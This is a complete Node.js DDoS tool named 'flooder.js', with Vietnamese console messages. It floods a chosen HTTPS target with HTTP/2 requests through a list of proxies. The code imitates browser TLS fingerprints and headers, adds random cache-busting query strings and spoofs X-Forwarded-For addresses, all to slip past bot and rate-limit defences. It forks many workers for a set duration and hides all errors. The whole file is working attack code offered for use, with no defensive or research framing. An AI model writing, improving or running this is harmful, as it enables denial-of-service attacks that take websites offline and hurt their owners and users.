const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 7) {
    console.log("Lệnh sử dụng: node flooder.js <target> <time> <rate> <threads> <proxyfile>");
    process.exit();
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6],
};

const parsedTarget = url.parse(args.target);
const proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/).filter(p => p.trim());

const browserProfiles = [
    {
        userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        secChUa: '\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"'
    },
    {
        userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
        secChUa: '\"Firefox\";v=\"127\"'
    },
    {
        userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        secChUa: '\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"'
    }
];

const acceptLanguages = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-CH,fr;q=0.9,en;q=0.8,de;q=0.7,*;q=0.5', 'de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7'];
const fetchDests = ['document', 'empty', 'script', 'style', 'image'];
const fetchModes = ['navigate', 'cors', 'no-cors', 'same-origin'];
const fetchSites = ['same-origin', 'same-site', 'cross-site', 'none'];

const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
const randomstring = (length) => crypto.randomBytes(length).toString('hex');
const spoofedIP = () => `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

const ciphers = "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305";
const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384";
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521";
const secureContext = tls.createSecureContext({ ciphers, sigalgs, honorCipherOrder: true, ecdhCurve });

if (cluster.isMaster) {
    console.log("--- ULTIMATE FLOODER ACTIVATED ---");
    console.log(`Mục tiêu: ${args.target}`);
    console.log(`Thời gian: ${args.time}s`);
    console.log(`Luồng: ${args.threads}`);
    console.log(`Rate/Luồng: ${args.rate}`);
    console.log("------------------------------------\n");

    const workers = [];
    for (let i = 0; i < args.threads; i++) {
        workers.push(cluster.fork());
    }

    let totalRequests = 0;
    const logInterval = setInterval(() => {
        let currentRps = 0;
        for(const worker of workers) {
            worker.on('message', (msg) => {
                if (msg.type === 'rps') {
                    currentRps += msg.count;
                }
            });
            worker.send({ type: 'get_rps' });
        }
        totalRequests += currentRps;
        console.log(`[+] RPS: ${currentRps.toLocaleString()} | Total Requests: ${totalRequests.toLocaleString()}`);
    }, 1000);

    setTimeout(() => {
        console.log("\n--- Tấn công kết thúc ---");
        clearInterval(logInterval);
        for (const worker of workers) {
            worker.destroy();
        }
        process.exit(0);
    }, args.time * 1000);

} else {
    let requestsSent = 0;
    process.on('message', (msg) => {
        if(msg.type === 'get_rps') {
            process.send({ type: 'rps', count: requestsSent });
            requestsSent = 0;
        }
    });

    for (let i = 0; i < args.rate; i++) {
        launchAttack();
    }
    
    function generateHeaders() {
        const browser = getRandomElement(browserProfiles);
        return {
            ":method": "GET",
            ":authority": parsedTarget.hostname,
            ":scheme": "https",
            ":path": parsedTarget.path + `?${randomstring(8)}=${randomstring(8)}`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": getRandomElement(acceptLanguages),
            "cache-control": "no-cache", "pragma": "no-cache",
            "referer": `https://${parsedTarget.hostname}/`,
            "sec-ch-ua": browser.secChUa,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": getRandomElement(fetchDests),
            "sec-fetch-mode": getRandomElement(fetchModes),
            "sec-fetch-site": getRandomElement(fetchSites),
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": browser.userAgent,
            "x-forwarded-for": spoofedIP()
        };
    }

    function launchAttack() {
        const proxy = getRandomElement(proxies).split(":");
        const proxyOptions = { host: proxy[0], port: parseInt(proxy[1]) };
        if (proxy.length > 2) { proxyOptions.auth = `${proxy[2]}:${proxy[3]}`; }

        const connectPayload = `CONNECT ${parsedTarget.hostname}:443 HTTP/1.1\r\nHost: ${parsedTarget.hostname}:443\r\n${proxyOptions.auth ? `Proxy-Authorization: Basic ${Buffer.from(proxyOptions.auth).toString('base64')}\r\n` : ''}Connection: Keep-Alive\r\n\r\n`;

        const socket = net.connect(proxyOptions.port, proxyOptions.host, () => {
            socket.write(connectPayload);
        });

        socket.on('data', (chunk) => {
            if (chunk.toString().includes("HTTP/1.1 200")) {
                const tlsSocket = tls.connect({
                    socket: socket, ALPNProtocols: ['h2'], servername: parsedTarget.hostname,
                    secureContext: secureContext,
                }, () => {
                    const client = http2.connect(parsedTarget.href, {
                        createConnection: () => tlsSocket,
                        settings: {
                            headerTableSize: 65536, maxFrameSize: 16384,
                            initialWindowSize: 6291456, maxHeaderListSize: 262144
                        }
                    });

                    client.on('connect', () => {
                        function sendRequest() {
                            if (client.destroyed) return;
                            const headers = generateHeaders();
                            const req = client.request(headers, { weight: 255, exclusive: true });
                            req.on('response', () => {
                                requestsSent++;
                                req.close();
                            });
                            req.on('error', (err) => { req.close(); });
                            req.end();
                        }
                        for (let i = 0; i < 20; i++) { sendRequest(); }
                    });

                    client.on('close', () => { client.destroy(); tlsSocket.destroy(); socket.destroy(); });
                    client.on('error', (err) => {});
                });
                tlsSocket.on('error', (err) => {});
            }
        });
        socket.on('error', (err) => { socket.destroy(); });
        socket.on('timeout', () => { socket.destroy(); });
    }
}

process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (err) => {});
